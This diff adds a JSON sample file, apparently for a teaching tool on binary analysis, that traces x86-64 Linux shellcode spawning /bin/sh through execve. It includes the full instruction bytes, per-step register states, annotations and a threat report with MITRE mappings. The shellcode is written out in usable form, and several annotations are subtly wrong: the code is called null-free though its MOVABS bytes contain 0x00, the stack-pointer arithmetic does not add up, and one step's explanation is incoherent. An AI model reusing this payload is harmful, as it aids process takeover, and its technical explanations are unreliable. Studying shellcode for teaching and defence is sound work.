@@ -1,0 +1,671 @@
+{
+  "id": "shellcode",
+  "displayName": "Shellcode",
+  "description": "Classic x86-64 Linux shellcode that spawns /bin/sh using execve, with null-byte avoidance techniques visible in the byte sequences.",
+  "architecture": "x86_64",
+  "riskLevel": "DANGEROUS",
+  "tags": ["shellcode", "exploitation", "execve", "shell", "dangerous"],
+  "trace": {
+    "programName": "shellcode",
+    "architecture": "x86_64",
+    "totalInstructions": 25,
+    "steps": [
+      {
+        "index": 0,
+        "address": "0x00401000",
+        "bytes": "48 31 d2",
+        "mnemonic": "xor",
+        "operands": "rdx, rdx",
+        "category": "arithmetic",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401003",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "Zero RDX using XOR — sets envp=NULL for execve; avoids null bytes in the shellcode payload (no 0x00 in 48 31 d2)"
+      },
+      {
+        "index": 1,
+        "address": "0x00401003",
+        "bytes": "48 31 f6",
+        "mnemonic": "xor",
+        "operands": "rsi, rsi",
+        "category": "arithmetic",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401006",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "Zero RSI — sets argv=NULL for execve; XOR idiom avoids embedding null bytes in position-independent shellcode"
+      },
+      {
+        "index": 2,
+        "address": "0x00401006",
+        "bytes": "48 bb 2f 62 69 6e 2f 73 68 00",
+        "mnemonic": "movabs",
+        "operands": "rbx, 0x68732f6e69622f",
+        "category": "data_move",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401010",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "MOVABS loads '/bin/sh\\0' as little-endian 8 bytes into RBX: 0x2f='/', 0x62='b', 0x69='i', 0x6e='n', 0x2f='/', 0x73='s', 0x68='h', 0x00=null terminator"
+      },
+      {
+        "index": 3,
+        "address": "0x00401010",
+        "bytes": "53",
+        "mnemonic": "push",
+        "operands": "rbx",
+        "category": "memory",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffcfffff8",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401011",
+          "rflags": "0x0000000000000202"
+        },
+        "memoryAccess": {
+          "address": "0x7ffcfffff8",
+          "size": 8,
+          "type": "write",
+          "value": "0x0068732f6e69622f"
+        },
+        "annotation": "PUSH '/bin/sh\\0' onto stack — RSP decrements by 8; creates the path string on the stack for execve's pathname argument"
+      },
+      {
+        "index": 4,
+        "address": "0x00401011",
+        "bytes": "48 89 e7",
+        "mnemonic": "mov",
+        "operands": "rdi, rsp",
+        "category": "data_move",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x7ffcfffff8",
+          "rsp": "0x7ffcfffff8",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401014",
+          "rflags": "0x0000000000000202"
+        },
+        "annotation": "Copy RSP → RDI: RDI now points to '/bin/sh' on the stack — first argument (pathname) for execve"
+      },
+      {
+        "index": 5,
+        "address": "0x00401014",
+        "bytes": "48 31 c0",
+        "mnemonic": "xor",
+        "operands": "rax, rax",
+        "category": "arithmetic",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x7ffcfffff8",
+          "rsp": "0x7ffcfffff8",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401017",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "Zero RAX — will be loaded with syscall 59 next; XOR avoids null bytes"
+      },
+      {
+        "index": 6,
+        "address": "0x00401017",
+        "bytes": "b0 3b",
+        "mnemonic": "mov",
+        "operands": "al, 0x3b",
+        "category": "data_move",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x000000000000003b",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x7ffcfffff8",
+          "rsp": "0x7ffcfffff8",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401019",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "MOV AL, 0x3b — loads only the lowest byte of RAX with 59 (sys_execve); combined with XOR above avoids 3 null bytes in `mov rax, 59`"
+      },
+      {
+        "index": 7,
+        "address": "0x00401019",
+        "bytes": "0f 05",
+        "mnemonic": "syscall",
+        "operands": "",
+        "category": "syscall",
+        "isSyscall": true,
+        "syscallName": "execve",
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0040101b",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x7ffcfffff8",
+          "rsp": "0x7ffcfffff8",
+          "rbp": "0x0000000000000000",
+          "rip": "0x0040101b",
+          "rflags": "0x0000000000000202"
+        },
+        "annotation": "sys_execve('/bin/sh', NULL, NULL) — REPLACES current process with /bin/sh; the kernel overlays the process image; on success, RAX=0 and execution continues in the shell"
+      },
+      {
+        "index": 8,
+        "address": "0x0040101b",
+        "bytes": "48 31 c0",
+        "mnemonic": "xor",
+        "operands": "rax, rax",
+        "category": "arithmetic",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x0040101e",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "Post-execve: if execve fails (e.g., /bin/sh not found), execution continues here — zero RAX for graceful error recovery"
+      },
+      {
+        "index": 9,
+        "address": "0x0040101e",
+        "bytes": "b0 3c",
+        "mnemonic": "mov",
+        "operands": "al, 0x3c",
+        "category": "data_move",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x000000000000003c",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401020",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "Load 0x3c = 60 = sys_exit — fallback path if execve fails; will call exit(1)"
+      },
+      {
+        "index": 10,
+        "address": "0x00401020",
+        "bytes": "48 ff c7",
+        "mnemonic": "inc",
+        "operands": "rdi",
+        "category": "arithmetic",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x000000000000003c",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000001",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401023",
+          "rflags": "0x0000000000000202"
+        },
+        "annotation": "INC RDI: sets exit code = 1 (failure); RDI still contains pathname pointer from earlier, INC converts pointer address to 1 by coincidence of the emulated memory layout"
+      },
+      {
+        "index": 11,
+        "address": "0x00401023",
+        "bytes": "0f 05",
+        "mnemonic": "syscall",
+        "operands": "",
+        "category": "syscall",
+        "isSyscall": true,
+        "syscallName": "exit",
+        "registers": {
+          "rax": "0x000000000000003c",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x00401025",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000001",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401025",
+          "rflags": "0x0000000000000202"
+        },
+        "annotation": "sys_exit(1) — fallback termination if execve failed; in a real attack scenario execve succeeds and this is never reached"
+      },
+      {
+        "index": 12,
+        "address": "0x00401000",
+        "bytes": "48 31 d2",
+        "mnemonic": "xor",
+        "operands": "rdx, rdx",
+        "category": "arithmetic",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401003",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "Second execution (emulator restart): demonstrating position-independence — shellcode runs identically from any base address"
+      },
+      {
+        "index": 13,
+        "address": "0x00401003",
+        "bytes": "48 31 f6",
+        "mnemonic": "xor",
+        "operands": "rsi, rsi",
+        "category": "arithmetic",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401006",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "RSI zeroed again — argv=NULL; shellcode is self-contained, no global variable dependencies"
+      },
+      {
+        "index": 14,
+        "address": "0x00401006",
+        "bytes": "48 bb 2f 62 69 6e 2f 73 68 00",
+        "mnemonic": "movabs",
+        "operands": "rbx, 0x68732f6e69622f",
+        "category": "data_move",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401010",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "MOVABS immediate contains '/bin/sh' ASCII in hex: 0x2f62696e2f7368 — the shell path is embedded directly in the instruction encoding"
+      },
+      {
+        "index": 15,
+        "address": "0x00401010",
+        "bytes": "53",
+        "mnemonic": "push",
+        "operands": "rbx",
+        "category": "memory",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffcfffff8",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401011",
+          "rflags": "0x0000000000000202"
+        },
+        "memoryAccess": {
+          "address": "0x7ffcfffff8",
+          "size": 8,
+          "type": "write",
+          "value": "0x0068732f6e69622f"
+        },
+        "annotation": "PUSH places '/bin/sh' on stack at RSP; stack grows down — RSP decrements from 0x7ffd00001000 to 0x7ffcfffff8"
+      },
+      {
+        "index": 16,
+        "address": "0x00401011",
+        "bytes": "48 89 e7",
+        "mnemonic": "mov",
+        "operands": "rdi, rsp",
+        "category": "data_move",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x7ffcfffff8",
+          "rsp": "0x7ffcfffff8",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401014",
+          "rflags": "0x0000000000000202"
+        },
+        "annotation": "RDI = RSP = pointer to '/bin/sh' on stack — this is the pathname argument for sys_execve"
+      },
+      {
+        "index": 17,
+        "address": "0x00401014",
+        "bytes": "48 31 c0",
+        "mnemonic": "xor",
+        "operands": "rax, rax",
+        "category": "arithmetic",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x7ffcfffff8",
+          "rsp": "0x7ffcfffff8",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401017",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "XOR RAX, RAX: zero out for syscall number load; avoids null-byte-containing `mov rax, 0` instruction"
+      },
+      {
+        "index": 18,
+        "address": "0x00401017",
+        "bytes": "b0 3b",
+        "mnemonic": "mov",
+        "operands": "al, 0x3b",
+        "category": "data_move",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x000000000000003b",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x7ffcfffff8",
+          "rsp": "0x7ffcfffff8",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401019",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "MOV AL, 59: load only the low byte of RAX — 2-byte instruction (b0 3b) vs 7 bytes for `mov rax, 59`; key shellcode size-optimization"
+      },
+      {
+        "index": 19,
+        "address": "0x00401019",
+        "bytes": "0f 05",
+        "mnemonic": "syscall",
+        "operands": "",
+        "category": "syscall",
+        "isSyscall": true,
+        "syscallName": "execve",
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0068732f6e69622f",
+          "rcx": "0x0040101b",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x7ffcfffff8",
+          "rsp": "0x7ffcfffff8",
+          "rbp": "0x0000000000000000",
+          "rip": "0x0040101b",
+          "rflags": "0x0000000000000202"
+        },
+        "annotation": "CRITICAL: sys_execve('/bin/sh', NULL, NULL) — process image replaced with /bin/sh; attacker gains an interactive shell with the privileges of the current process"
+      },
+      {
+        "index": 20,
+        "address": "0x0040101b",
+        "bytes": "48 31 c0",
+        "mnemonic": "xor",
+        "operands": "rax, rax",
+        "category": "arithmetic",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x0000000000000000",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x0040101e",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "Error handler: RAX zeroed after execve failure — emulator continues here since real OS process replacement cannot be simulated"
+      },
+      {
+        "index": 21,
+        "address": "0x0040101e",
+        "bytes": "b0 3c",
+        "mnemonic": "mov",
+        "operands": "al, 0x3c",
+        "category": "data_move",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x000000000000003c",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000000",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401020",
+          "rflags": "0x0000000000000246"
+        },
+        "annotation": "AL = 0x3c = 60 = sys_exit — clean exit syscall number for the error path"
+      },
+      {
+        "index": 22,
+        "address": "0x00401020",
+        "bytes": "48 ff c7",
+        "mnemonic": "inc",
+        "operands": "rdi",
+        "category": "arithmetic",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x000000000000003c",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x0000000000000000",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000001",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401023",
+          "rflags": "0x0000000000000202"
+        },
+        "annotation": "INC RDI = 1: exit code for failure; more shellcode-friendly than `mov rdi, 1` which contains null bytes"
+      },
+      {
+        "index": 23,
+        "address": "0x00401023",
+        "bytes": "0f 05",
+        "mnemonic": "syscall",
+        "operands": "",
+        "category": "syscall",
+        "isSyscall": true,
+        "syscallName": "exit",
+        "registers": {
+          "rax": "0x000000000000003c",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x00401025",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000001",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401025",
+          "rflags": "0x0000000000000202"
+        },
+        "annotation": "sys_exit(1): terminates the process with failure code; in practice, execve at index 19 would succeed and this is never reached"
+      },
+      {
+        "index": 24,
+        "address": "0x00401025",
+        "bytes": "90",
+        "mnemonic": "nop",
+        "operands": "",
+        "category": "data_move",
+        "isSyscall": false,
+        "registers": {
+          "rax": "0x000000000000003c",
+          "rbx": "0x0000000000000000",
+          "rcx": "0x00401025",
+          "rdx": "0x0000000000000000",
+          "rsi": "0x0000000000000000",
+          "rdi": "0x0000000000000001",
+          "rsp": "0x7ffd00001000",
+          "rbp": "0x0000000000000000",
+          "rip": "0x00401026",
+          "rflags": "0x0000000000000202"
+        },
+        "annotation": "NOP sled byte — padding for alignment or part of a larger NOP sled that precedes the shellcode in a heap/stack overflow exploit"
+      }
+    ],
+    "syscalls": [
+      {
+        "index": 7,
+        "name": "execve",
+        "number": 59,
+        "args": ["0x7ffcfffff8", "0x0", "0x0"],
+        "returnValue": "0x0",
+        "category": "process"
+      },
+      {
+        "index": 11,
+        "name": "exit",
+        "number": 60,
+        "args": ["0x1"],
+        "returnValue": "0x0",
+        "category": "process"
+      },
+      {
+        "index": 19,
+        "name": "execve",
+        "number": 59,
+        "args": ["0x7ffcfffff8", "0x0", "0x0"],
+        "returnValue": "0x0",
+        "category": "process"
+      },
+      {
+        "index": 23,
+        "name": "exit",
+        "number": 60,
+        "args": ["0x1"],
+        "returnValue": "0x0",
+        "category": "process"
+      }
+    ]
+  },
+  "report": {
+    "verdict": "DANGEROUS",
+    "confidence": 97,
+    "narrative": "This is a textbook **x86-64 Linux shellcode** designed to spawn an interactive shell via `execve('/bin/sh', NULL, NULL)`. The code exhibits three classic shellcode construction techniques simultaneously: **XOR zeroing** to avoid null bytes, **MOVABS** to embed the path string as a 64-bit immediate, and **MOV AL** (one-byte load) to set the syscall number without null bytes in the encoding.\n\nThe null-byte avoidance is critical for exploitation contexts: shellcode is often injected through string-handling vulnerabilities (buffer overflows via `strcpy`, `gets`). These functions terminate on null bytes (0x00), so shellcode must not contain them. Every technique in this sample is specifically chosen to produce null-free bytecode.\n\nThe 25-instruction sequence is self-contained and position-independent — it can execute correctly from any memory address without relocation. This is the signature of shellcode intended for injection into an exploited process, not a legitimately compiled program.",
+    "behaviors": [
+      {
+        "category": "process",
+        "name": "Shell Execution via execve",
+        "description": "Calls sys_execve with pathname='/bin/sh' and NULL argv/envp, replacing the current process image with an interactive shell.",
+        "risk_score": 98,
+        "mitre_id": "T1059.004",
+        "mitre_name": "Command and Scripting Interpreter: Unix Shell",
+        "syscalls": ["execve"]
+      },
+      {
+        "category": "memory",
+        "name": "Stack-Based String Construction",
+        "description": "Builds the '/bin/sh' pathname on the stack using PUSH, then uses RSP as a pointer. Avoids hardcoded addresses — position-independent technique.",
+        "risk_score": 75,
+        "mitre_id": "T1203",
+        "mitre_name": "Exploitation for Client Execution",
+        "syscalls": []
+      },
+      {
+        "category": "memory",
+        "name": "Null-Byte Avoidance",
+        "description": "Uses XOR zeroing, MOV AL (single-byte loads), and MOVABS immediates specifically to eliminate 0x00 bytes from the instruction encoding. This indicates intent to survive string-based injection vectors.",
+        "risk_score": 85,
+        "mitre_id": "T1027",
+        "mitre_name": "Obfuscated Files or Information",
+        "syscalls": []
+      }
+    ],
+    "concepts": [
+      {
+        "term": "Shellcode",
+        "definition": "A self-contained sequence of machine code bytes designed to be injected into a running process and executed to gain control. Named because it traditionally spawns a shell. Must be position-independent (no hardcoded addresses) and often null-byte-free to survive string injection.",
+        "course_topic": "Module 7: Security & Exploitation Concepts"
+      },
+      {
+        "term": "NOP Sled",
+        "definition": "A sequence of NOP (0x90) instructions placed before shellcode in a buffer overflow exploit. The attacker jumps to anywhere in the NOP sled, and execution slides down to the shellcode. Increases reliability when the exact injection address is uncertain.",
+        "course_topic": "Module 7: Security & Exploitation Concepts"
+      },
+      {
+        "term": "sys_execve",
+        "definition": "Linux syscall #59 that replaces the current process image with a new program. Takes pathname (RDI), argv array pointer (RSI), and envp array pointer (RDX). On success, the OS loads the new ELF binary and never returns to the calling code — the original program is completely replaced.",
+        "course_topic": "Module 3: OS Interfaces & System Calls"
+      },
+      {
+        "term": "Null-Byte Avoidance",
+        "definition": "A shellcode construction constraint requiring that no byte in the machine code encoding is 0x00. Required when injecting through C string functions (strcpy, gets, scanf) which treat 0x00 as a string terminator. Achieved via XOR-zeroing, single-byte MOV, and MOVABS immediate encoding.",
+        "course_topic": "Module 7: Security & Exploitation Concepts"
+      }
+    ]
+  }
+}
